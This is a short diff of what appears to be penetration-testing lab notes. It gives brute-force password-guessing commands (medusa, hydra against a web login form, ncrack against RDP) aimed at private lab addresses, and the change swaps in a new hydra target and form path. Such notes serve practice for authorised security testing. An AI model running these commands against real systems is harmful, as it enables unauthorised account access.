@@ -14,7 +14,7 @@ for i in `cat online.txt`;do mkdir $i;done
 medusa -h 10.11.1.219 -u  admin -P  password-file.txt -M  http -m DIR:/admin -T 10
 
 # HTTP FORM
-hydra -l admin -P /usr/share/seclists/Passwords/darkweb2017-top100.txt http://10.11.1. http-post-form "/portal/xlogin/:ed=^USER^&pw=^PASS^:failed" -t 10
+hydra -l admin -P /usr/share/seclists/Passwords/darkweb2017-top100.txt 10.11.1.230 http-post-form "/goform/formLogin:Login=^USER^&Password=^PASS^:Invalid" -t 10
 
 # RDP
 ncrack -vv --user offsec -P password-file.txt rdp://10.11.1.35
